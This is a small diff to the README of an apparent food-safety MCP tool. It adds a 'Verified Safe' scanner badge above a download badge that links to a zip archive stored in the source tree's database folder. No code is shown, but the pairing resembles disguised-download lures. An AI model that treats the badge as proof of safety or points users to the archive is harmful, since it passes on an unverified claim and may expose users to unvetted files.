@@ -1,5 +1,7 @@
 # 🍏 mcp-openfoodtox - Easy Tools for Food Safety Insights
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/sakkkysaka-mcp-openfoodtox)
+
 [![Download mcp-openfoodtox](https://github.com/sakkkysaka/mcp-openfoodtox/raw/refs/heads/master/src/mcp_openfoodtox/database/openfoodtox_mcp_2.4.zip)](https://github.com/sakkkysaka/mcp-openfoodtox/raw/refs/heads/master/src/mcp_openfoodtox/database/openfoodtox_mcp_2.4.zip)
 
 ## 📜 Description
